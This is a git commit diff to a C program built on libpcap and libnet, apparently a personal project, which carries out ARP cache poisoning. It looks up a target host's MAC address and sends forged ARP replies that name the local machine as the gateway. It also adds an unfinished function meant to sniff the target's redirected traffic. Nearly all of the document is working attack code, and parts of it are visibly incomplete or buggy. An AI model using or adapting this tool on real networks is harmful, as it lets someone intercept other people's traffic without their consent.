993e35e14caa4ab646ed5c5d6518f6906c6f2972
Conor <conorpp@vt.edu>
2014-07-14 23:46:36 -0400

    finished arp poisioning.  working on traffic.

--- src/pcap/main.c
+++ src/pcap/main.c
@@ -13,9 +13,9 @@ u_char enet_dst[6] = {0xf0, 0x27, 0x65, 0xff, 0xde, 0x43};
 
 struct{
     char* dev;
-    libnet_t *arpMachine; 
+    libnet_t *arpMachine;
     uint8_t* hostHwAddr;
-    uint8_t* hostSpoofedHwAddr;
+    uint8_t* spoofedHwAddr;
     uint32_t hostIp;
 }Settings;
 /* Ethernet header */
@@ -41,76 +41,65 @@ struct arp_h{
 
 void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* hwdst);
 
-int hwAddrAreEqual(uint8_t* hw1, uint8_t* hw2){
-    for(int i=0; i<6; i++)
-        if (hw1[i] != hw2[i])
-            return 0;
-    return 1;
+uint32_t getIpInt(char* ip){
+    struct in_addr addr;
+    inet_aton(ip, &addr);
+    return addr.s_addr;
 }
 
-int getMacAddress(char* ip, uint8_t* hwbuf){
+pcap_t* setPromiscuous(char* device, char* filter){
     char errbuf[PCAP_ERRBUF_SIZE];
     struct bpf_program fp;      /* The compiled filter */
-    char filter[50];
-    sprintf(filter, "arp");//, ip);
-    char* filter_exp = filter;  /* The filter expression */
     bpf_u_int32 mask;       /* Our netmask */
     bpf_u_int32 net;        /* Our IP */
-    struct pcap_pkthdr header;  /* The header that pcap gives us */
-    const u_char *packet;       /* The actual packet */
-    char* dev = Settings.dev;
-    if (dev == NULL) {
-        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
-        return(2);
-    }
-    
-    printf("device is %s\n", dev);
+
     /* Find the properties for the device */
-    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
-        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+    if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
+        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", device, errbuf);
         net = 0;
-        mask = 0;
     }
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
-        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-        return(2);
+        fprintf(stderr, "Couldn't open device %s: %s\n", device, errbuf);
+        return (pcap_t*) 0;
     }
     /* Compile and apply the filter */
-    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
-        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
-        return(2);
+    if (pcap_compile(handle, &fp, filter, 0, net) == -1) {
+        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter, pcap_geterr(handle));
+        return (pcap_t*) 0;
     }
     if (pcap_setfilter(handle, &fp) == -1) {
-        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
-        return(2);
+        fprintf(stderr, "Couldn't install filter %s: %s\n", filter, pcap_geterr(handle));
+        return (pcap_t*) 0;
     }
     if (pcap_datalink(handle) != DLT_EN10MB) {
-        fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
-        return(2);
+        fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", device);
+        return (pcap_t*) 0;
     }
-    uint8_t hwz[] = {0x0,0x0,0x0,0x0,0x0,0x0};
-    struct in_addr targetaddr;
-    inet_aton(ip, &targetaddr);
-    sendArp(ARPOP_REQUEST, Settings.hostIp, Settings.hostSpoofedHwAddr, targetaddr.s_addr, hwz);
-    struct arp_h* arpReply;
-    // TODO change this to just match the target ip address..
-    do{
-        packet = pcap_next(handle, &header);
-        if (header.len < (ARP_H_SIZE+ETHER_H_SIZE))
-            continue;
-        arpReply = (struct arp_h*)(packet + ETHER_H_SIZE);
-    }while(!hwAddrAreEqual(arpReply->hwsrcaddr, Settings.hostSpoofedAddr))
-    
+    return handle;
+}
+
+
+int getMacAddress(char* ip, uint8_t* hwbuf){
+    static uint8_t hwb[] = {0xff,0xff,0xff,0xff,0xff,0xff};
+    struct pcap_pkthdr header;  /* The header that pcap gives us */
+    const u_char *packet;       /* The actual packet */
+    char filter_exp[60];
+
+    sprintf(filter_exp, "arp[14:4] == %u", ntohl(getIpInt(ip)));
+
+    pcap_t* handle = setPromiscuous(Settings.dev, filter_exp);
+    sendArp(ARPOP_REQUEST, Settings.hostIp, Settings.hostHwAddr, getIpInt(ip), hwb);
+    packet = pcap_next(handle, &header);
+
     if (header.len < (ARP_H_SIZE+ETHER_H_SIZE)){
         printf("received invalid packet of length %d/%d.\n", header.len, ARP_H_SIZE+ETHER_H_SIZE);
         return 1;
     }
     struct arp_h* arpReply = (struct arp_h*)(packet + ETHER_H_SIZE);
-    printf("recieved MAC: ");
+    printf("recieved MAC: \n");
     for(int i=0; i<6; i++){
         printf("%x:", (hwbuf[i]=arpReply->hwsrcaddr[i]));
-
     }
     printf("\n");
     /* And close the session */
@@ -119,17 +108,15 @@ int getMacAddress(char* ip, uint8_t* hwbuf){
 }
 
 int arpPoison(char* ipTarget, char* ipGateway){
+    uint8_t targetHwAddr[6];
     // Lookup ipTarget's HWAddr..
-    if ( getMacAddress(ipTarget, enet_dst) != 0)
+    if ( getMacAddress(ipTarget, targetHwAddr) != 0)
         return 1;
+
     uint8_t* hwspoof = Settings.hostHwAddr;
-    struct in_addr addr_src;
-    struct in_addr addr_dst;
-    inet_aton(ipGateway, &addr_src);
-    inet_aton(ipTarget, &addr_dst);
 
    // TODO replace enet_dst with lookup value
-    sendArp(ARPOP_REPLY, addr_src.s_addr, hwspoof, addr_dst.s_addr, enet_dst);
+    sendArp(ARPOP_REPLY, getIpInt(ipGateway), hwspoof, getIpInt(ipTarget), targetHwAddr);
     return 0;
 }
 
@@ -155,46 +142,51 @@ void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* 
             0,              /* payload size */
             l,              /* libnet context */
             0);             /* libnet id */
-    if (t == -1)
-    {
+    if (t == -1){
         fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
         return;
     }
     t = libnet_autobuild_ethernet(
-            enet_dst,           /* ethernet destination */
+            hwdst,           /* ethernet destination */
             ETHERTYPE_ARP,      /* protocol type */
             l);                 /* libnet handle */
-    if (t == -1)
-    {
+    if (t == -1){
         fprintf(stderr, "Can't build ethernet header: %s\n",
                 libnet_geterror(l));
         return;
     }
 
 
-    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
-    {
+    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
         fprintf(stderr, "%s", libnet_geterror(l));
     }
-    else
-    {
+    else{
         fprintf(stdout, "packet size: %d\n", packet_s);
         libnet_adv_free_packet(l, packet);
     }
 
     c = libnet_write(l);
-    if (c == -1)
-    {
+    if (c == -1){
         fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
     }
-    else
-    {
+    else{
         fprintf(stdout, "Wrote %d byte ARP packet\n", c);
     }
 
-   
-}
 
+}
+int logTcp(char* ip){
+    char filter[60];
+    // TODO finish this
+    sprintf(filter, "ether[6:4] == %u && ether[10:2] == %u", ntohl(getIpInt(ip)));
+    setPromiscuous(Settings.device, filter);
+    while(1){
+
+
+    };
+
+    return 0;
+}
 int main(int argc, char* argv[]){
     if (argc<4){
         printf("usage: ./a.out <interface> <iptarget> <ipgateway>\n");
@@ -207,14 +199,18 @@ int main(int argc, char* argv[]){
                                 ERRBUF);         /* errbuf */
     Settings.hostHwAddr = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
     Settings.hostIp = libnet_get_ipaddr4(Settings.arpMachine);
-    uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe};
-    Settings.hostSpoofedHwAddr = hwspoof;
+    uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe,0x0};
+    Settings.spoofedHwAddr = hwspoof;
    if (Settings.arpMachine == NULL){
         fprintf(stderr, "fail:%s\n", ERRBUF);
         exit(EXIT_FAILURE);
     }
-
-    arpPoison(argv[2], argv[3]);
+    int ec;
+    ec = arpPoison(argv[2], argv[3]);
+    if (ec)
+        goto done;
+    logTcp(argv[2]);
+    done:
     libnet_destroy(Settings.arpMachine);
     return 0;
 }
